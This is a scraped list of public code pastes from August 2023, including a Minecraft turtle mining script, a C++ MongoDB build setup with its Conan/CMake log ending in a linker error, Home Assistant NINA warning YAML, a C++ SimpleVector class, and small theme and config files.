    protected $primaryKey = 'id_user';

    protected $useAutoIncrement = true;

    protected $returnType     = 'array';
    protected $useSoftDeletes = false;

    protected $allowedFields = ['name', 'email','phone','foto'];

    // Dates
    protected $useTimestamps = false;
    protected $dateFormat    = 'datetime';
    protected $createdField  = 'created_at';
    protected $updatedField  = 'updated_at';

    // Validation
    protected $validationRules      = [];
    protected $validationMessages   = [];
    protected $skipValidation       = false;
    protected $cleanValidationRules = true;

    // Callbacks
    protected $allowCallbacks = true;
    protected $beforeInsert   = [];
    protected $afterInsert    = [];
    protected $beforeUpdate   = [];
    protected $afterUpdate    = [];
    protected $beforeFind     = [];
    protected $afterFind      = [];
    protected $beforeDelete   = [];
    protected $afterDelete    = [];
}"
yhXZbxQL,CC1,flufy174,Lua,Saturday 19th of August 2023 08:24:46 AM CDT,"function refuelFromInventory()
    local i = 1
    while i <= 16 do
        turtle.select(i)
        if turtle.refuel(0) == true then
            turtle.refuel()
        end
        i = i + 1
    end

    turtle.select(1)
end


function mineToBedrock()
    function blockBelowIsBedrock()
        _, block = turtle.inspectDown()
        return block['name'] == ""minecraft:bedrock""
    end

    while blockBelowIsBedrock() == false do
        turtle.digDown()
        turtle.down()
    end

end

refuelFromInventory()

mineToBedrock()

"
GBXmdZAt,Error.txt,Vlad3955,C++,Saturday 19th of August 2023 08:12:38 AM CDT,"vlad@vlad-VirtualBox:~/CPP/Pract/Geo_App_Pract/fillMongo$ conan install . --output-folder=build --build=missing

======== Input profiles ========
Profile host:
[settings]
arch=x86_64
build_type=Release
compiler=gcc
compiler.cppstd=gnu17
compiler.libcxx=libstdc++11
compiler.version=11
os=Linux

Profile build:
[settings]
arch=x86_64
build_type=Release
compiler=gcc
compiler.cppstd=gnu17
compiler.libcxx=libstdc++11
compiler.version=11
os=Linux


======== Computing dependency graph ========
Graph root
    conanfile.txt: /home/vlad/CPP/Pract/Geo_App_Pract/fillMongo/conanfile.txt
Requirements
    boost/1.82.0#902463606663219fc8c6d2102f1b8c6a - Cache
    bzip2/1.0.8#411fc05e80d47a89045edc1ee6f23c1d - Cache
    icu/73.2#7fda454a65a205158299111824a06964 - Cache
    libbacktrace/cci.20210118#ec1aa63bbc10145c6a299e68e711670c - Cache
    mongo-c-driver/1.24.3#0f7fab56b6aa4867545dad53fb28f9f8 - Cache
    mongo-cxx-driver/3.8.0#ef7cc93095a17599e684d7fd42048a70 - Cache
    openssl/3.1.1#3a25e05b364f335633143656dc265841 - Cache
    snappy/1.1.10#916523630083f6d855cb2977de8eefb6 - Cache
    zlib/1.2.13#e377bee636333ae348d51ca90874e353 - Cache
    zstd/1.5.5#93372fe14bb7883bd4de82914e0a1841 - Cache
Build requirements
    b2/4.9.6#2e02945ad41739b8051247d14fe8297d - Cache
    meson/1.0.0#15586c0ac6f682805875ef903dbe7ee2 - Cache
    ninja/1.11.1#77587f8c8318662ac8e5a7867eb4be21 - Cache
    pkgconf/1.9.3#5da3944c3226f5764374e4b8b4e1d055 - Cache
Resolved version ranges
    openssl/[>=1.1 <4]: openssl/3.1.1

======== Computing necessary packages ========
icu/73.2: Checking 11 compatible configurations:
icu/73.2: '80802e7ecdb0ef88bc0d5572b12e815d079f92fc': compiler.cppstd=98
icu/73.2: '908a582e3bf048e71f41bf5afae9b7d622c40886': compiler.cppstd=gnu98
icu/73.2: '9b2045a8c01ef21108920f1c62454349a0ee7881': compiler.cppstd=11
icu/73.2: '69155ee18ee3f5ce18efe3281915aacf9fdec29e': compiler.cppstd=gnu11
icu/73.2: '493a181f728ff8c4e51e82090db48015c3a06340': compiler.cppstd=14
icu/73.2: '353a7711693942d8e5997b3c70d22d6bebbe75f7': compiler.cppstd=gnu14
icu/73.2: 'ade788d9a2035d27cb7a36dfc6df106c25911eaf': compiler.cppstd=17
icu/73.2: Main binary package '0393fa2da0773d95cd9cc9b8d177270ec13bc275' missing. Using compatible package 'ade788d9a2035d27cb7a36dfc6df106c25911eaf'
snappy/1.1.10: Checking 9 compatible configurations:
snappy/1.1.10: '41697afb79f2436d3d33bb869461eb602c1df42c': compiler.cppstd=11
snappy/1.1.10: '16efa9ce732bdbe0c221532703c3c8fb7bc1f12f': compiler.cppstd=gnu11
snappy/1.1.10: 'cf28cd71f9a332331508ccc0ca8247b3eddd7597': compiler.cppstd=14
snappy/1.1.10: '3ec7188a93c4b447ca62b7eef09f74a5f5a63f82': compiler.cppstd=gnu14
snappy/1.1.10: 'c07e372c0deeded3ce33d5d57a386e2f0d243442': compiler.cppstd=17
snappy/1.1.10: Main binary package 'eaa18a10a957f3e0ac87d3b5e0cbfa945882b811' missing. Using compatible package 'c07e372c0deeded3ce33d5d57a386e2f0d243442'
boost/1.82.0: Checking 9 compatible configurations:
boost/1.82.0: 'c0a4de08950a15d31d75ce3ddfa595e4f2e01f0c': compiler.cppstd=11
boost/1.82.0: '77b8acd3c19cf74b8a6fe705b9a326ae0d77d975': compiler.cppstd=gnu11
boost/1.82.0: '68c972e03cdd9efdb8023df81030d381cc80fccc': compiler.cppstd=14
boost/1.82.0: 'f1f62f6bc3a2e81d31ba1b62296c76aa57255b77': compiler.cppstd=gnu14
boost/1.82.0: '0873eb552f47bbaf047010b912342a85bcddea5d': compiler.cppstd=17
boost/1.82.0: Main binary package '3c1e18af9522393ab5d100cbe5b6df9a30146d3c' missing. Using compatible package '0873eb552f47bbaf047010b912342a85bcddea5d'
mongo-cxx-driver/3.8.0: Checking 9 compatible configurations:
mongo-cxx-driver/3.8.0: 'a988185d15b82b36c9fb5f863ebd92e2f57f416f': compiler.cppstd=11
mongo-cxx-driver/3.8.0: '2df57eef1a57a1b27afc022f3f8fb23b7ab9ae14': compiler.cppstd=gnu11
mongo-cxx-driver/3.8.0: 'c69e319234b941d0e43e490e4346554b006e22f5': compiler.cppstd=14
mongo-cxx-driver/3.8.0: 'c64352cd19e3815e03282b207cebee1cb54eedb6': compiler.cppstd=gnu14
mongo-cxx-driver/3.8.0: 'a3dbb0b936db6240f1c4afc09d5b9f751aac6d3c': compiler.cppstd=17
mongo-cxx-driver/3.8.0: Main binary package 'c5cd2af9dc7d36d79414e65c9675ef3169406aeb' missing. Using compatible package 'a3dbb0b936db6240f1c4afc09d5b9f751aac6d3c'
Requirements
    boost/1.82.0#902463606663219fc8c6d2102f1b8c6a:0873eb552f47bbaf047010b912342a85bcddea5d#aed2338f58447e7ddef3d9ca7d45fd3a - Cache
    bzip2/1.0.8#411fc05e80d47a89045edc1ee6f23c1d:763ddd53d7a4775fe84a285f56005a096d9786fd#3c39f4d84b7d234e9632c57059cc49f5 - Cache
    icu/73.2#7fda454a65a205158299111824a06964:ade788d9a2035d27cb7a36dfc6df106c25911eaf#c8560036dcbfedaced191ea7dfed70e1 - Cache
    libbacktrace/cci.20210118#ec1aa63bbc10145c6a299e68e711670c:b647c43bfefae3f830561ca202b6cfd935b56205#af5aa1daf14bcf7e7254f15d75e8ab44 - Cache
    mongo-c-driver/1.24.3#0f7fab56b6aa4867545dad53fb28f9f8:3cafe04f1cd9e0c5841cbd8862c239a872d3f839#cf16251f179eea4b73e0f205b9365592 - Cache
    mongo-cxx-driver/3.8.0#ef7cc93095a17599e684d7fd42048a70:a3dbb0b936db6240f1c4afc09d5b9f751aac6d3c#96f03327244865df4e4f7980bd7b7df2 - Cache
    openssl/3.1.1#3a25e05b364f335633143656dc265841:b23402676a8897e538b5392074e693be3e0d8262#f50da17aefd56957c3603d9ba46299af - Cache
    snappy/1.1.10#916523630083f6d855cb2977de8eefb6:c07e372c0deeded3ce33d5d57a386e2f0d243442#befd0c359f9140b8ce11c2380e14db49 - Cache
    zlib/1.2.13#e377bee636333ae348d51ca90874e353:b647c43bfefae3f830561ca202b6cfd935b56205#c68df5ae1b6d523306693ef4295b670f - Cache
    zstd/1.5.5#93372fe14bb7883bd4de82914e0a1841:668e7888fadd10ea273722487025fa96b62e2a52#293969474624c87af50d805e497561d1 - Cache
Build requirements
Skipped binaries
    b2/4.9.6, meson/1.0.0, ninja/1.11.1, pkgconf/1.9.3

======== Installing packages ========
bzip2/1.0.8: Already installed! (1 of 10)
icu/73.2: Already installed! (2 of 10)
libbacktrace/cci.20210118: Already installed! (3 of 10)
snappy/1.1.10: Already installed! (4 of 10)
zlib/1.2.13: Already installed! (5 of 10)
zstd/1.5.5: Already installed! (6 of 10)
boost/1.82.0: Already installed! (7 of 10)
openssl/3.1.1: Already installed! (8 of 10)
mongo-c-driver/1.24.3: Already installed! (9 of 10)
mongo-cxx-driver/3.8.0: Already installed! (10 of 10)
WARN: deprecated: Usage of deprecated Conan 1.X features that will be removed in Conan 2.X:
WARN: deprecated:     'cpp_info.names' used in: zlib/1.2.13, icu/73.2, mongo-cxx-driver/3.8.0, snappy/1.1.10, boost/1.82.0, zstd/1.5.5, mongo-c-driver/1.24.3, bzip2/1.0.8, openssl/3.1.1
WARN: deprecated:     'cpp_info.build_modules' used in: openssl/3.1.1, bzip2/1.0.8
WARN: deprecated:     'env_info' used in: boost/1.82.0, openssl/3.1.1, bzip2/1.0.8, icu/73.2
WARN: deprecated:     'cpp_info.filenames' used in: boost/1.82.0, mongo-c-driver/1.24.3, mongo-cxx-driver/3.8.0
WARN: deprecated:     'user_info' used in: boost/1.82.0

======== Finalizing install (deploy, generators) ========
conanfile.txt: Writing generators to /home/vlad/CPP/Pract/Geo_App_Pract/fillMongo/build
conanfile.txt: Generator 'CMakeToolchain' calling 'generate()'
conanfile.txt: CMakeToolchain generated: conan_toolchain.cmake
conanfile.txt: Preset 'conan-release' added to CMakePresets.json. Invoke it manually using 'cmake --preset conan-release' if using CMake>=3.23
conanfile.txt: If your CMake version is not compatible with CMakePresets (<3.23) call cmake like: 'cmake <path> -G ""Unix Makefiles"" -DCMAKE_TOOLCHAIN_FILE=/home/vlad/CPP/Pract/Geo_App_Pract/fillMongo/build/conan_toolchain.cmake -DCMAKE_POLICY_DEFAULT_CMP0091=NEW -DCMAKE_BUILD_TYPE=Release'
conanfile.txt: CMakeToolchain generated: CMakePresets.json
conanfile.txt: CMakeToolchain generated: ../CMakeUserPresets.json
conanfile.txt: Generator 'CMakeDeps' calling 'generate()'
conanfile.txt: Generating aggregated env files
conanfile.txt: Generated aggregated env files: ['conanbuild.sh', 'conanrun.sh']
Install finished successfully


vlad@vlad-VirtualBox:~/CPP/Pract/Geo_App_Pract/fillMongo$ cd build/


vlad@vlad-VirtualBox:~/CPP/Pract/Geo_App_Pract/fillMongo/build$ cmake .. -DCMAKE_TOOLCHAIN_FILE=conan_toolchain.cmake -DCMAKE_BUILD_TYPE=Release
-- Using Conan toolchain: /home/vlad/CPP/Pract/Geo_App_Pract/fillMongo/build/conan_toolchain.cmake
-- Conan toolchain: C++ Standard 17 with extensions ON
-- The C compiler identification is GNU 11.4.0
-- The CXX compiler identification is GNU 11.4.0
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working C compiler: /usr/bin/cc - skipped
-- Detecting C compile features
-- Detecting C compile features - done
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++ - skipped
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Conan: Component target declared 'mongo::bsoncxx_static'
-- Conan: Component target declared 'mongo::mongocxx_static'
-- Conan: Component target declared 'mongo::bson_static'
-- Conan: Component target declared 'mongo::mongoc_static'
-- Conan: Component target declared 'OpenSSL::Crypto'
-- Conan: Component target declared 'OpenSSL::SSL'
-- Conan: Target declared 'openssl::openssl'
-- Conan: Target declared 'ZLIB::ZLIB'
-- Conan: Including build module from '/home/vlad/.conan2/p/opensdf6870d0c39ab/p/lib/cmake/conan-official-openssl-variables.cmake'
-- Conan: Component target declared 'Snappy::snappy'
-- Conan: Component target declared 'zstd::libzstd_static'
-- Conan: Component target declared 'ICU::data'
-- Conan: Component target declared 'ICU::dt'
-- Conan: Component target declared 'ICU::uc'
-- Conan: Component target declared 'ICU::i18n'
-- Conan: Component target declared 'ICU::in'
-- Conan: Component target declared 'ICU::io'
-- Conan: Component target declared 'ICU::tu'
-- Conan: Component target declared 'ICU::test'
-- Conan: Target declared 'icu::icu'
-- Conan: Component target declared 'Boost::diagnostic_definitions'
-- Conan: Component target declared 'Boost::disable_autolinking'
-- Conan: Component target declared 'Boost::dynamic_linking'
-- Conan: Component target declared 'Boost::headers'
-- Conan: Component target declared 'Boost::boost'
-- Conan: Component target declared 'boost::_libboost'
-- Conan: Component target declared 'Boost::atomic'
-- Conan: Component target declared 'Boost::container'
-- Conan: Component target declared 'Boost::context'
-- Conan: Component target declared 'Boost::date_time'
-- Conan: Component target declared 'Boost::exception'
-- Conan: Component target declared 'Boost::math'
-- Conan: Component target declared 'Boost::math_c99'
-- Conan: Component target declared 'Boost::math_c99f'
-- Conan: Component target declared 'Boost::math_c99l'
-- Conan: Component target declared 'Boost::math_tr1'
-- Conan: Component target declared 'Boost::math_tr1f'
-- Conan: Component target declared 'Boost::math_tr1l'
-- Conan: Component target declared 'Boost::program_options'
-- Conan: Component target declared 'Boost::regex'
-- Conan: Component target declared 'Boost::serialization'
-- Conan: Component target declared 'Boost::stacktrace'
-- Conan: Component target declared 'Boost::stacktrace_addr2line'
-- Conan: Component target declared 'Boost::stacktrace_backtrace'
-- Conan: Component target declared 'Boost::stacktrace_basic'
-- Conan: Component target declared 'Boost::stacktrace_noop'
-- Conan: Component target declared 'Boost::system'
-- Conan: Component target declared 'Boost::test'
-- Conan: Component target declared 'Boost::test_exec_monitor'
-- Conan: Component target declared 'Boost::url'
-- Conan: Component target declared 'Boost::wserialization'
-- Conan: Component target declared 'Boost::chrono'
-- Conan: Component target declared 'Boost::coroutine'
-- Conan: Component target declared 'Boost::filesystem'
-- Conan: Component target declared 'Boost::json'
-- Conan: Component target declared 'Boost::nowide'
-- Conan: Component target declared 'Boost::prg_exec_monitor'
-- Conan: Component target declared 'Boost::random'
-- Conan: Component target declared 'Boost::thread'
-- Conan: Component target declared 'Boost::timer'
-- Conan: Component target declared 'Boost::type_erasure'
-- Conan: Component target declared 'Boost::unit_test_framework'
-- Conan: Component target declared 'Boost::wave'
-- Conan: Component target declared 'Boost::contract'
-- Conan: Component target declared 'Boost::fiber'
-- Conan: Component target declared 'Boost::fiber_numa'
-- Conan: Component target declared 'Boost::graph'
-- Conan: Component target declared 'Boost::iostreams'
-- Conan: Component target declared 'Boost::locale'
-- Conan: Component target declared 'Boost::log'
-- Conan: Component target declared 'Boost::log_setup'
-- Conan: Target declared 'boost::boost'
-- Conan: Target declared 'BZip2::BZip2'
-- Conan: Including build module from '/home/vlad/.conan2/p/bzip26d48265eb59fb/p/lib/cmake/conan-official-bzip2-variables.cmake'
-- Conan: Target declared 'libbacktrace::libbacktrace'
-- Configuring done
-- Generating done
-- Build files have been written to: /home/vlad/CPP/Pract/Geo_App_Pract/fillMongo/build


vlad@vlad-VirtualBox:~/CPP/Pract/Geo_App_Pract/fillMongo/build$ cmake --build .
[ 50%] Building CXX object CMakeFiles/fillMongo.dir/src/main.cpp.o
[100%] Linking CXX executable bin/fillMongo
/usr/bin/ld: /home/vlad/.conan2/p/mongoa90d8c7e2f119/p/lib/libmongoc-static-1.0.a(mongoc-client.c.o): in function `_mongoc_get_rr_search':
mongoc-client.c:(.text+0xb5): undefined reference to `__res_nsearch'
/usr/bin/ld: /home/vlad/.conan2/p/mongoa90d8c7e2f119/p/lib/libmongoc-static-1.0.a(mongoc-client.c.o): in function `srv_callback':
mongoc-client.c:(.text+0xe67): undefined reference to `__dn_expand'
collect2: error: ld returned 1 exit status
gmake[2]: *** [CMakeFiles/fillMongo.dir/build.make:112: bin/fillMongo] Error 1
gmake[1]: *** [CMakeFiles/Makefile2:83: CMakeFiles/fillMongo.dir/all] Error 2
gmake: *** [Makefile:91: all] Error 2
vlad@vlad-VirtualBox:~/CPP/Pract/Geo_App_Pract/fillMongo/build$ "
SGHcQvaR,main.cpp,Vlad3955,C++,Saturday 19th of August 2023 08:06:10 AM CDT,"#include <cstdlib>
#include <iostream>

#include <mongocxx/client.hpp>
#include <mongocxx/instance.hpp>
#include <mongocxx/uri.hpp>

// Compilation check
#include <bsoncxx/json.hpp>

int main() {
    const mongocxx::instance instance_;  // This should be done only once.
    mongocxx::client client{mongocxx::uri{}};
    return EXIT_SUCCESS;
}"
kaLkeEmv,2am,sanjaux,autoconf,Saturday 19th of August 2023 08:04:43 AM CDT,"{
  ""window_background"": ""1e222a"",
  ""main_background"": ""1e1f20"",
  ""panel_background"": ""111112"",
  ""control_background"": ""161618"",
  ""foreground"": ""898989"",
  ""text"": ""cfd1d3"",
  ""knob"": ""111112"",
  ""unimportant_text"": ""797876"",
  ""passive"": ""6a6968"",
  ""active"": ""4f536d"",
  ""modulation"": ""ff8020"",
  ""audio_rate_modulation"": ""71c742"",
  ""aux_modulation"": ""dcc959"",
  ""modulation_background"": ""000000"",
  ""alert"": ""bf312e"",
  ""encoder"": ""111112"",
  ""handle"": ""cacaca"",
  ""mute"": ""ab211e"",
  ""solo"": ""2f861a"",
  ""left"": ""61b264"",
  ""right"": ""b460ae"",
  ""mid"": ""437ddd"",
  ""side"": ""d79e4f"",
  ""selection_background"": ""3c4a60"",
  ""selection_foreground"": ""eeeeee"",
  ""grid_major"": ""434140"",
  ""grid_minor"": ""353332"",
  ""disabled_tint"": ""525356"",
  ""phase_plant_backdrop"": """",
  ""phase_plant_backdrop_alpha"": ""1.0"",
  ""multipass_backdrop"": """",
  ""multipass_backdrop_alpha"": ""1.0"",
  ""snap_heap_backdrop"": """",
  ""snap_heap_backdrop_alpha"": ""1.0"",
  ""group_foreground"": ""0B0B0B"",
  ""group_background"": ""161618""
}"
YPV8n5b2,Conanfile.txt,Vlad3955,C++,Saturday 19th of August 2023 07:59:59 AM CDT,"[requires]
mongo-cxx-driver/3.8.0

[generators]
CMakeDeps
CMakeToolchain
"
ayNNrwMM,CMakeLists.txt,Vlad3955,CMake,Saturday 19th of August 2023 07:57:10 AM CDT,"cmake_minimum_required(VERSION 3.20)

project(fillMongo C CXX)

set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ""${CMAKE_BINARY_DIR}/bin"")
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY ""${CMAKE_BINARY_DIR}/bin"")

#set(CMAKE_CXX_STANDARD 17)
#set(CMAKE_CXX_STANDARD_REQUIRED ON)
#set(CMAKE_CXX_EXTENSIONS OFF)

find_package(mongocxx REQUIRED)
#set(THREADS_PREFER_PTHREAD_FLAG ON)
#find_package(Threads REQUIRED)

set(${PROJECT_NAME}_SRC ""./src/main.cpp"")

source_group(source FILES ${${PROJECT_NAME}_SRC})

add_executable(""${PROJECT_NAME}"" ""${${PROJECT_NAME}_SRC}"")

#target_link_libraries(""${PROJECT_NAME}"" PRIVATE mongo::mongocxx_static mongo::bsoncxx_static Threads::Threads)

if(TARGET mongo::mongocxx_shared)
  target_link_libraries(${PROJECT_NAME} PRIVATE mongo::mongocxx_shared mongo::bsoncxx_shared)
else()
  target_link_libraries(${PROJECT_NAME} PRIVATE mongo::mongocxx_static mongo::bsoncxx_static)
endif()


"
K5TxG8Hk,Home Assistant / NINA Warnmeldungen Automation,Flo_R1der,YAML,Saturday 19th of August 2023 07:55:35 AM CDT,"alias: NINA Warnmeldung Benachrichtigung
description: """"
trigger:
  - platform: state
    entity_id:
      - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_1
      - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_2
      - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_3
      - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_4
      - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_5
    to: ""on""
    alias: ""State trigger: warning_meckenbeuren_bodenseekreis_baden_wurttemberg_1-5""
condition:
  - condition: or
    conditions:
      - condition: template
        value_template: >-
          {{ trigger_severity == 'Moderate' and
          is_state('input_boolean.nina_warnmeldung_moderat', 'on') }}
        alias: Severity = Moderate
      - condition: template
        value_template: >-
          {{ trigger_severity == 'Severe' and
          is_state('input_boolean.nina_warnmeldung_hoch', 'on') }}
        alias: Severity = Severe
      - condition: template
        value_template: >-
          {{ trigger_severity == 'Extreme' and
          is_state('input_boolean.nina_warnmeldung_extrem', 'on') }}
        alias: Severity = Extreme
    alias: Check Severity & Notification-Configuration
action:
  - service: script.custom_flexible_notification
    data:
      title: NINA Warnmeldung
      message: ""{{ trigger_headline }}""
      data:
        notification_icon: mdi:alert-outline
variables:
  trigger_severity: ""{{ trigger.to_state.attributes.severity }}""
  trigger_headline: ""{{ trigger.to_state.attributes.headline }}""
mode: single
"
iavkWrFB,NINA Warnmeldungen / Home Assistant Card,Flo_R1der,YAML,Saturday 19th of August 2023 07:47:11 AM CDT,"type: conditional
conditions:
  - entity: binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_1
    state: 'on'
card:
  type: entity-filter
  entities:
    - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_1
    - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_2
    - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_3
    - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_4
    - binary_sensor.warning_meckenbeuren_bodenseekreis_baden_wurttemberg_5
  state_filter:
    - 'on'
  card:
    type: markdown
    title: NINA Warnmeldungen
    content: |-
      {% for list in config.entities %}
        {% if state_attr(list.entity, 'severity') == ""Minor"" %} <ha-alert alert-type=""info""> {% endif -%}
        {% if state_attr(list.entity, 'severity') == ""Moderate"" %} <ha-alert alert-type=""info""> {% endif -%}
        {% if state_attr(list.entity, 'severity') == ""Severe"" %} <ha-alert alert-type=""warning""> {% endif -%}
        {% if state_attr(list.entity, 'severity') == ""Extreme"" %} <ha-alert alert-type=""error""> {% endif -%}
        **{{ state_attr(list.entity, 'headline') }}** <br>
        {{ state_attr(list.entity, 'description') }} 
        {% if state_attr(list.entity, 'recommended_actions') != """" %} <br> **Empfohlene Aktionen:** <br>
        {{ state_attr(list.entity, 'recommended_actions') }} {%- endif %} </ha-alert>
      {%- endfor %}
"
qF2QhnjQ,Untitled,shizaero,C++,Saturday 19th of August 2023 07:18:13 AM CDT,"#pragma once

#include <initializer_list>
#include ""array_ptr.h""
#include <stdexcept>

template <typename Type>
class SimpleVector {
private:
    ArrayPtr<Type> data;
    size_t size_;
    size_t capacity_;
public:
    using Iterator = Type*;
    using ConstIterator = const Type*;

    SimpleVector() noexcept : data(nullptr), size_(0), capacity_(0) {}

    // Создаёт вектор из size элементов, инициализированных значением по умолчанию
    explicit SimpleVector(size_t size) {
        this->size_ = size;
        this->capacity_ = size;
        
        ArrayPtr<Type> new_data(size);
        for (size_t i = 0; i < size; ++i) {
                new_data[i] = Type{};  // Initialize new elements with default value
            }
        data.swap(new_data);
    }

    // Создаёт вектор из size элементов, инициализированных значением value
    SimpleVector(size_t size, const Type& value) {
        this->size_ = size;
        this->capacity_ = size;
        
        ArrayPtr<Type> new_data(size);
        data.swap(new_data);
        
        for(size_t i = 0; i < size; ++i){
            data[i] = value;
        }
    }

    // Создаёт вектор из std::initializer_list
    SimpleVector(std::initializer_list<Type> init) {
        this->size_ = init.size();
        this->capacity_ = init.size();
        
        ArrayPtr<Type> new_data(size_);
        data.swap(new_data);
        
        size_t i = 0;
        for (const auto& item : init) {
            data[i++] = item;
        }
    }
    
    SimpleVector(const SimpleVector& other) 
     : size_(other.size_), capacity_(other.capacity_)
    {
        ArrayPtr<Type> new_data(size_);
        for(size_t i = 0; i < size_; ++i){
            new_data[i] = other.data[i];
        }
        data.swap(new_data);
        //size_ = other.size_;
        //capacity_ = other.capacity_;
    }

    SimpleVector& operator=(const SimpleVector& rhs) {
        if (this == &rhs) {
            return *this;
        }
        SimpleVector temp(rhs);
        swap(temp);
        return *this;
    }

    // Добавляет элемент в конец вектора
    // При нехватке места увеличивает вдвое вместимость вектора
    void PushBack(const Type& item) {
        if (size_ == capacity_) {
            // Увеличиваем вместимость вдвое
            size_t new_capacity = capacity_ == 0 ? 1 : capacity_ * 2;
            Resize(new_capacity);
            //size_ += 1;
        }
        if (size_ < capacity_)
        {
            data[size_++] = item;
        }
        data[size_ - 1] = item;
    }

    // Вставляет значение value в позицию pos.
    // Возвращает итератор на вставленное значение
    // Если перед вставкой значения вектор был заполнен полностью,
    // вместимость вектора должна увеличиться вдвое, а для вектора вместимостью 0 стать равной 1
    Iterator Insert(ConstIterator pos, const Type& value) {
        size_t index = pos - data.Get();
 
        if (size_ == capacity_) {
            size_t new_capacity = capacity_ == 0 ? 1 : capacity_ * 2;
            Resize(new_capacity);
            //size_ += 1;
        }
 
        for (size_t i = size_; i > index; --i) {
            data[i] = data[i - 1];
        }
 
        data[index] = value;
 
        return data.Get() + index;
    }

    // ""Удаляет"" последний элемент вектора. Вектор не должен быть пустым
    void PopBack() noexcept {
         if (size_ > 0) {
            --size_;
        }
    }

    // Удаляет элемент вектора в указанной позиции
    Iterator Erase(ConstIterator pos) {
         size_t index = pos - data.Get();
 
        if (index >= size_) {
            return end();
        }
 
        for (size_t i = index; i < size_ - 1; ++i) {
            data[i] = data[i + 1];
        }
 
        --size_;
 
        return data.Get() + index;
    }

    // Обменивает значение с другим вектором
    void swap(SimpleVector& other) noexcept {
        data.swap(other.data);
        std::swap(size_, other.size_);
        std::swap(capacity_, other.capacity_);
    }

    // Возвращает количество элементов в массиве
    size_t GetSize() const noexcept {
        return size_;
    }

    // Возвращает вместимость массива
    size_t GetCapacity() const noexcept {
        return capacity_;
    }

    // Сообщает, пустой ли массив
    bool IsEmpty() const noexcept {
        return size_ == 0;
    }

    // Возвращает ссылку на элемент с индексом index
    Type& operator[](size_t index) noexcept{
        return data[index];
    }

    // Возвращает константную ссылку на элемент с индексом index
    const Type& operator[](size_t index) const  noexcept{
        return data[index];
    }

    // Возвращает константную ссылку на элемент с индексом index
    // Выбрасывает исключение std::out_of_range, если index >= size
    Type& At(size_t index) {
        if (index >= size_) {
            throw std::out_of_range(""Index out of range"");
        }
        return data[index];
    }

    // Возвращает константную ссылку на элемент с индексом index
    // Выбрасывает исключение std::out_of_range, если index >= size
    const Type& At(size_t index) const {
        if (index >= size_) {
            throw std::out_of_range(""Index out of range"");
        }
        return data[index];
    }

    // Обнуляет размер массива, не изменяя его вместимость
    void Clear() noexcept {
        size_ = 0;
    }

    // Изменяет размер массива.
    // При увеличении размера новые элементы получают значение по умолчанию для типа Type
    void Resize(size_t new_size) {
         if (new_size > capacity_) {
            ArrayPtr<Type> new_data(new_size);
            for (size_t i = 0; i < size_; ++i) {
                new_data[i] = data[i];
            }
            for (size_t i = size_; i < new_size; ++i) {
                new_data[i] = Type();  // Initialize new elements with default value
            }
            data.swap(new_data);
            capacity_ = new_size;
        }
        if(new_size < size_) std::fill(data.Get() + new_size, data.Get() + size_, 0);
        size_ = new_size;
    }

    // Возвращает итератор на начало массива
    // Для пустого массива может быть равен (или не равен) nullptr
    Iterator begin() noexcept {
        return data.Get();
    }

    // Возвращает итератор на элемент, следующий за последним
    // Для пустого массива может быть равен (или не равен) nullptr
    Iterator end() noexcept {
        return data.Get() + size_;
    }

    // Возвращает константный итератор на начало массива
    // Для пустого массива может быть равен (или не равен) nullptr
    ConstIterator begin() const noexcept {
        return data.Get();
    }

    // Возвращает итератор на элемент, следующий за последним
    // Для пустого массива может быть равен (или не равен) nullptr
    ConstIterator end() const noexcept {
        return data.Get() + size_; 
    }

    // Возвращает константный итератор на начало массива
    // Для пустого массива может быть равен (или не равен) nullptr
    ConstIterator cbegin() const noexcept {
        return begin();
    }

    // Возвращает итератор на элемент, следующий за последним
    // Для пустого массива может быть равен (или не равен) nullptr
    ConstIterator cend() const noexcept {
        return end();
    }
};

template <typename Type>
inline bool operator==(const SimpleVector<Type>& lhs, const SimpleVector<Type>& rhs) {
    if (lhs.GetSize() != rhs.GetSize())
    {
        return false;
    }
    
    return std::equal(lhs.begin(), lhs.end(), rhs.begin());
}

template <typename Type>
inline bool operator!=(const SimpleVector<Type>& lhs, const SimpleVector<Type>& rhs) {
    return !(lhs == rhs);
}

template <typename Type>
inline bool operator<(const SimpleVector<Type>& lhs, const SimpleVector<Type>& rhs) {
    return std::lexicographical_compare(lhs.begin(), lhs.end(), rhs.begin(), rhs.end());
}

template <typename Type>
inline bool operator<=(const SimpleVector<Type>& lhs, const SimpleVector<Type>& rhs) {
    return !(lhs > rhs);
}

template <typename Type>
inline bool operator>(const SimpleVector<Type>& lhs, const SimpleVector<Type>& rhs) {
    return rhs < lhs;
}

template <typename Type>
inline bool operator>=(const SimpleVector<Type>& lhs, const SimpleVector<Type>& rhs) {
    return !(lhs < rhs);
} "
hfqDdpT7,figure-transformation.cpp,Valderman,C++,Saturday 19th of August 2023 07:10:18 AM CDT,"// В целом, этот код отрабатывает, при эвенте движения мыши с зажатой правой кнопкой

// Эта точка получается, когда я нажимаю правой кнопкой мыщи на фигуру
QPointF lastRightPressedCoord{m_clickTracker->lastRightMousePressed()};

foreach (QGraphicsItem* item, m_parentScene->selectedItems())
{
	QTransform transform;
	QPointF	   center = item->sceneBoundingRect().center();

	transform.translate(center.x(), center.y());

	qreal angle = qAtan2(lastRightPressedCoord.y() - sceneCoord.y(),
						 lastRightPressedCoord.x() - sceneCoord.x());

	transform.rotate(angle);
	transform.translate(-center.x(), -center.y());

	item->setPos(transform.map(item->pos()));
	item->setRotation(item->rotation() + angle);
}"
FxZ89gJc,ABOUT_MARIN_YU,TessCarstairs,HTML,Saturday 19th of August 2023 06:53:24 AM CDT,"OBSERVAÇÕES:
Cor Box: #0000;
Cor de Background: #ffffff ou #ffe8f1


